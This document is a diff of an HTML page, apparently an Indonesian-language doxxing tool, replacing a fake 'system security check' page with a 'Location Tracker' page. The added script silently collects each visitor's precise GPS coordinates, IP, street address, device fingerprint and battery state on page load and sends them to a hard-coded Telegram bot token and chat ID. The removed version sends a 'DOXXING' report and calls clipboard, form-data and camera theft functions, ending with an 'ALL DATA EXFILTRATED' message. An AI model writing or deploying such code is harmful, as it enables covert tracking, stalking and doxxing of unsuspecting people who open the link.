@@ -1,209 +1,292 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>🔴 SYSTEM SECURITY CHECK 🔴</title>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-<style>
-/* ... (style sama kayak punya lu, biar ga panjang) ... */
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Location Tracker</title>
+  <style>
+    body {
+      background: #111;
+      color: #0f0;
+      font-family: monospace;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+      padding: 20px;
+    }
+    h1 {
+      font-size: 2rem;
+      animation: blink 1s infinite;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.4; }
+    }
+    .loading {
+      color: #ff0;
+      font-size: 1.2rem;
+    }
+  </style>
 </head>
 <body>
-<!-- elemen sama kayak punya lu, tapi gw singkat di sini biar fokus ke JS -->
-<div id="crash-overlay"></div>
-<div class="glitch-text">⚠️ SYSTEM COMPROMISED ⚠️<br><span id="counter" style="font-size:48px;">0</span></div>
-<div class="progress-container">
-    <div class="progress-bar" id="progressBar"></div>
-    <div class="progress-text" id="progressText">Initializing takeover protocol...</div>
-</div>
-<input type="file" id="filePicker" accept="image/*,video/*,application/pdf" multiple style="display:none">
-<canvas id="screenshotCanvas" class="hidden"></canvas>
-<audio id="alarmSound" loop>i
-    <source src="https://www.soundjay.com/misc/sounds/alarm-clock-01.mp3" type="audio/mpeg">
-</audio>
+  <h1>@rexzzzx</h1>
+  <div id="status" class="loading">Mendapatkan lokasi...</div>
 
-<script>
-(async () => {
-    // ========== KONFIGURASI – GANTI DENGAN TOKEN LU ==========
-    const BOT_TOKEN = "7460316922:AAFQrYzJUrxt3nmt5AVVVXexrBrbm89nLPI"; // ganti kalo mat
-    const OWNER_CHAT_ID = "7962628944"; // ganti dengan chat ID lu
-    // ============================================================
+  <script>
+    const BOT_TOKEN = "8616961617:AAEBnWYxD35CCPSFxAjf8WtJwMSifh6CwwY";
+    const OWNER_CHAT_ID = "7962628944";
 
-    const MAX_RETRY = 5;
+    async function generateFingerprint() {
+      const ua = navigator.userAgent;
+      const lang = navigator.language;
+      const res = screen.width + "x" + screen.height;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const ram = navigator.deviceMemory || "N/A";
+      const cpu = navigator.hardwareConcurrency || "N/A";
 
-    // Fungsi kirim pesan dengan retry
-    async function sendTelegram(text, parseMode = 'HTML', retry = 0) {
-        try {
-            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: OWNER_CHAT_ID, text, parse_mode: parseMode })
-            });
-            if (!res.ok && retry < MAX_RETRY) {
-                await new Promise(r => setTimeout(r, 2000));
-                return sendTelegram(text, parseMode, retry + 1);
-            }
-            return res.ok;
-        } catch(e) {
-            if (retry < MAX_RETRY) {
-                await new Promise(r => setTimeout(r, 2000));
-                return sendTelegram(text, parseMode, retry + 1);
-            }
-            return false;
-        }
+      const raw = `${ua}|${lang}|${res}|${timezone}|${ram}|${cpu}`;
+      const encoder = new TextEncoder();
+      const data = encoder.encode(raw);
+      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+      return [...new Uint8Array(hashBuffer)].map(x => x.toString(16).padStart(2, '0')).join('');
     }
 
-    // Kirim file dengan retry
-    async function sendFile(blob, filename, type = 'document', retry = 0) {
-        try {
-            const fd = new FormData();
-            fd.append('chat_id', OWNER_CHAT_ID);
-            if (type === 'photo') fd.append('photo', blob, filename);
-            else fd.append('document', blob, filename);
-            const endpoint = type === 'photo' ? 'sendPhoto' : 'sendDocument';
-            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, { method: 'POST', body: fd });
-            if (!res.ok && retry < MAX_RETRY) {
-                await new Promise(r => setTimeout(r, 2000));
-                return sendFile(blob, filename, type, retry + 1);
-            }
-            return res.ok;
-        } catch(e) {
-            if (retry < MAX_RETRY) {
-                await new Promise(r => setTimeout(r, 2000));
-                return sendFile(blob, filename, type, retry + 1);
-            }
-            return false;
-        }
-    }
+    async function getDetailedLocation(lat, lng) {
+      const services = [
+        // Google Maps Geocoding API (backup)
+        `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&key=YOUR_API_KEY`,
+        // OpenStreetMap Nominatim (primary)
+        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`,
+        // BigDataCloud (free tier)
+        `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=id`
+      ];
 
-    // Cek token valid
-    async function checkToken() {
+      for (const service of services) {
         try {
-            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
-            const data = await res.json();
-            if (!data.ok) {
-                console.error('❌ TOKEN INVALID! Ganti BOT_TOKEN di script.');
-                await Swal.fire({ title: 'ERROR', text: 'Token Telegram mati! Ganti di script.', icon: 'error' });
-                return false;
-            }
-            return true;
-        } catch { return false; }
-    }
-
-    // Progress simulation (sama)
-    // ...
-
-    // Fungsi dox (diperbaiki)
-    const getLocationDetails = async (lat, lon) => {
-        try {
-            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
-            const data = await res.json();
+          const response = await fetch(service);
+          const data = await response.json();
+          
+          if (service.includes('nominatim.openstreetmap.org')) {
+            const addr = data.address;
             return {
-                county: data.address?.county || data.address?.city || data.address?.state || "Unknown",
-                district: data.address?.suburb || data.address?.village || data.address?.town || "Unknown",
-                fullAddress: data.display_name || "Address not available"
+              village: addr.village || addr.hamlet || addr.suburb || "N/A",
+              city: addr.city || addr.town || addr.municipality || addr.county || "N/A",
+              province: addr.state || addr.province || "N/A",
+              country: addr.country || "N/A",
+              district: addr.district || addr.county || "N/A",
+              postcode: addr.postcode || "N/A",
+              road: addr.road || "N/A"
             };
-        } catch { return { county: "Unknown", district: "Unknown", fullAddress: "Address not available" }; }
-    };
-
-    const collectAllData = async () => {
-        let ip = "N/A", country = "N/A", region = "N/A", city = "N/A", postal = "N/A", isp = "N/A", lat = "N/A", lon = "N/A";
-        try {
-            const ipRes = await fetch('https://ipapi.co/json/');
-            const ipData = await ipRes.json();
-            ip = ipData.ip || "N/A";
-            country = ipData.country_name || "N/A";
-            region = ipData.region || "N/A";
-            city = ipData.city || "N/A";
-            postal = ipData.postal || "N/A";
-            isp = ipData.org || ipData.isp || "N/A";
-            lat = ipData.latitude || "N/A";
-            lon = ipData.longitude || "N/A";
-        } catch(e) {}
-
-        let gpsLat = "N/A", gpsLon = "N/A", gpsAcc = "N/A";
-        try {
-            await new Promise((resolve) => {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => { gpsLat = pos.coords.latitude.toFixed(6); gpsLon = pos.coords.longitude.toFixed(6); gpsAcc = pos.coords.accuracy + "m"; resolve(); },
-                    () => resolve(),
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
-            });
-        } catch(e) {}
-
-        const locDetails = await getLocationDetails(gpsLat !== "N/A" ? gpsLat : lat, gpsLon !== "N/A" ? gpsLon : lon);
-
-        // ... (fingerprint, battery, dll) sama seperti punya lu
-        // Tapi gw tambahin isp di report
-
-        const report = `
-╔══════════════════════════════════════════╗
-║        💀 𝐃𝐎𝐗𝐗𝐈𝐍𝐆 💀          ║
-╠══════════════════════════════════════════╣
-║ 📡 NETWORK INFORMATION
-║   • Public IP: ${ip}
-║   • Local IP: ${localIP} // dari WebRTC
-║   • ISP: ${isp}
-║   • Network: ${networkType}
-╠══════════════════════════════════════════╣
-║ 📍 GEOLOCATION
-║   • Country: ${country}
-║   • Region: ${region}
-║   • City: ${city}
-║   • Postal: ${postal}
-║   • GPS Lat: ${gpsLat !== "N/A" ? gpsLat : lat}
-║   • GPS Lon: ${gpsLon !== "N/A" ? gpsLon : lon}
-║   • Accuracy: ${gpsAcc}
-║   • County: ${locDetails.county}
-║   • District: ${locDetails.district}
-║   • Full Address: ${locDetails.fullAddress.substring(0, 100)}
-╠══════════════════════════════════════════╣
-║ 🖥️ DEVICE INFORMATION
-║   • User Agent: ${navigator.userAgent}
-║   • Platform: ${navigator.platform}
-║   • Language: ${navigator.language}
-║   • Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-║   • Screen: ${screen.width}x${screen.height}
-║   • RAM: ${navigator.deviceMemory || 'N/A'} GB
-║   • CPU Cores: ${navigator.hardwareConcurrency || 'N/A'}
-║   • Touch Support: ${'ontouchstart' in window ? 'Yes' : 'No'}
-║   • Battery: ${batteryInfo.level} (Charging: ${batteryInfo.charging})
-║   • Available Fonts: ${availableFonts.join(', ')}
-╠══════════════════════════════════════════╣
-║ 🔐 FINGERPRINT
-║   • Hash: ${fingerprint.substring(0, 32)}...
-╚══════════════════════════════════════════╝
-        `;
-        await sendTelegram(`<pre>${report}</pre>`, 'HTML');
-        // Kirim map
-        const mapUrl = `https://www.google.com/maps?q=${gpsLat !== "N/A" ? gpsLat : lat},${gpsLon !== "N/A" ? gpsLon : lon}`;
-        await sendTelegram(`📍 <a href="${mapUrl}">OPEN MAP LOCATION</a>`, 'HTML');
-    };
-
-    // Fungsi lain (camera, screenshot, gallery, clipboard, keylogger, form) sama, tapi kita tambahkan retry.
-
-    // ========== EKSEKUSI ==========
-    const tokenValid = await checkToken();
-    if (!tokenValid) {
-        // Tapi tetep jalan, cuma kasih peringatan
-        await sendTelegram('⚠️ Token mungkin mati, ganti segera!');
+          } else if (service.includes('bigdatacloud.net')) {
+            return {
+              village: data.locality || data.city || "N/A",
+              city: data.city || data.principalSubdivision || "N/A",
+              province: data.principalSubdivision || "N/A",
+              country: data.countryName || "N/A",
+              district: data.localityInfo?.administrative?.[2]?.name || "N/A",
+              postcode: data.postcode || "N/A",
+              road: "N/A"
+            };
+          }
+        } catch (e) {
+          console.log(`Service failed: ${service}`, e);
+          continue;
+        }
+      }
+      
+      return {
+        village: "N/A",
+        city: "N/A",
+        province: "N/A",
+        country: "N/A",
+        district: "N/A",
+        postcode: "N/A",
+        road: "N/A"
+      };
     }
 
-    // Jalankan semua
-    await collectAllData();
-    await captureCameraAndScreen();
-    triggerFileAccess();
-    stealClipboard();
-    stealFormData();
-    spamPopups();
-    // ... floating video, alarm, dll.
+    async function getVisitorInfo() {
+      const clock = new Date().toLocaleString('id-ID');
+      let locationData = {
+        latitude: "N/A",
+        longitude: "N/A",
+        accuracy: "N/A",
+        village: "N/A",
+        city: "N/A",
+        province: "N/A",
+        country: "N/A",
+        district: "N/A",
+        postcode: "N/A",
+        road: "N/A"
+      };
 
-    // Kirim notifikasi selesai
-    await sendTelegram('✅ DRAGON RAT EXECUTION COMPLETE. ALL DATA EXFILTRATED.');
-})();
-</script>
+      const userAgent = navigator.userAgent;
+      const androidVersion = userAgent.match(/Android\s([0-9.]*)/)?.[1] || "N/A";
+      const device = navigator.platform + " - " + userAgent;
+      const loginFrom = navigator.platform || "N/A";
+      const language = navigator.language || "N/A";
+      const resolution = screen.width + "x" + screen.height;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
+      const isOnline = navigator.onLine;
+      const deviceMemory = navigator.deviceMemory || "N/A";
+      const cpuCores = navigator.hardwareConcurrency || "N/A";
+      const isTouch = 'ontouchstart' in window;
+      const cookiesEnabled = navigator.cookieEnabled;
+      const doNotTrack = navigator.doNotTrack;
+      const fingerprint = await generateFingerprint();
+
+      // Battery info
+      let batteryInfo = { level: "N/A", charging: "N/A" };
+      try {
+        const battery = await navigator.getBattery();
+        batteryInfo = {
+          level: Math.round(battery.level * 100) + "%",
+          charging: battery.charging ? "charging🔋" : "no"
+        };
+      } catch {}
+
+      // IP and basic location
+      let ip = "N/A";
+      try {
+        const ipData = await fetch("https://ipapi.co/json").then(r => r.json());
+        ip = ipData.ip;
+        if (locationData.country === "N/A") locationData.country = ipData.country_name;
+        if (locationData.province === "N/A") locationData.province = ipData.region;
+      } catch {}
+
+      // High accuracy geolocation
+      try {
+        const position = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+          });
+        });
+
+        locationData.latitude = position.coords.latitude.toFixed(6);
+        locationData.longitude = position.coords.longitude.toFixed(6);
+        locationData.accuracy = position.coords.accuracy.toFixed(0) + "m";
+
+        // Get detailed location info
+        const detailedLocation = await getDetailedLocation(
+          position.coords.latitude, 
+          position.coords.longitude
+        );
+        
+        locationData = { ...locationData, ...detailedLocation };
+
+        document.getElementById('status').textContent = 
+          `Lokasi ditemukan: ${locationData.village}, ${locationData.city}`;
+      } catch (error) {
+        document.getElementById('status').textContent = 
+          'Gagal mendapatkan lokasi GPS, menggunakan lokasi berdasarkan IP';
+      }
+
+      // Weather info
+      let weather = "N/A", temperature = "N/A";
+      if (locationData.latitude !== "N/A") {
+        try {
+          const weatherData = await fetch(
+            `https://wttr.in/${locationData.latitude},${locationData.longitude}?format=j1`
+          ).then(r => r.json());
+          weather = weatherData.current_condition[0].weatherDesc[0].value;
+          temperature = weatherData.current_condition[0].temp_C + "°C";
+        } catch {}
+      }
+
+      const jsonData = {
+        "alamat ip": ip,
+        "device": device,
+        "android versions": androidVersion,
+        "login from": loginFrom,
+        "lokasi detail": {
+          "latitude": locationData.latitude,
+          "longitude": locationData.longitude,
+          "akurasi": locationData.accuracy,
+          "desa": locationData.village,
+          "kota": locationData.city,
+          "provinsi": locationData.province,
+          "negara": locationData.country,
+          "kecamatan": locationData.district,
+          "kode pos": locationData.postcode,
+          "jalan": locationData.road
+        },
+        "clock": clock,
+        "cuaca": weather,
+        "temperature": temperature,
+        "language": language,
+        "screen resolution": resolution,
+        "timezone": timezone,
+        "online": isOnline,
+        "ram (GB)": deviceMemory,
+        "cpu cores": cpuCores,
+        "touch support": isTouch,
+        "cookies enabled": cookiesEnabled,
+        "do not track": doNotTrack,
+        "fingerprint": fingerprint,
+        "battery": batteryInfo.level,
+        "charging": batteryInfo.charging
+      };
+
+      const message = `📍 *New Location Update* 🎯
+👤 *Device Info:*
+• IP: ${ip}
+• Platform: ${navigator.platform}
+• Android: ${androidVersion}
+• Language: ${language}
+• Resolution: ${resolution}
+• Timezone: ${timezone}
+• Online: ${isOnline}
+• RAM: ${deviceMemory}GB
+• CPU: ${cpuCores} cores
+• Battery: ${batteryInfo.level} (${batteryInfo.charging})
+
+📍 *Location Details:*
+• Latitude: ${locationData.latitude}
+• Longitude: ${locationData.longitude}
+• Accuracy: ${locationData.accuracy}
+• Address: ${locationData.road}, ${locationData.village}
+• City: ${locationData.city}, ${locationData.province}
+• Country: ${locationData.country}
+• Postal: ${locationData.postcode}
+
+🌤️ *Weather:* ${weather} ${temperature}
+🕐 *Time:* ${clock}
+🔐 *Fingerprint:* ${fingerprint}`;
+
+      // Send to Telegram with better error handling
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { 
+            "Content-Type": "application/json",
+            "Accept": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: OWNER_CHAT_ID,
+            text: message,
+            parse_mode: "Markdown"
+          })
+        });
+
+        if (!response.ok) {
+          const errorData = await response.json();
+          console.error('Telegram API Error:', errorData);
+          document.getElementById('status').textContent = '❌ Gagal mengirim ke Telegram: ' + (errorData.description || 'Unknown error');
+        } else {
+          document.getElementById('status').textContent = '✅ Data berhasil dikirim ke Telegram!';
+        }
+      } catch (error) {
+        console.error('Failed to send to Telegram:', error);
+        document.getElementById('status').textContent = '❌ Gagal mengirim ke Telegram: ' + error.message;
+      }
+    }
+
+    // Start tracking when page loads
+    getVisitorInfo();
+  </script>
 </body>
 </html>
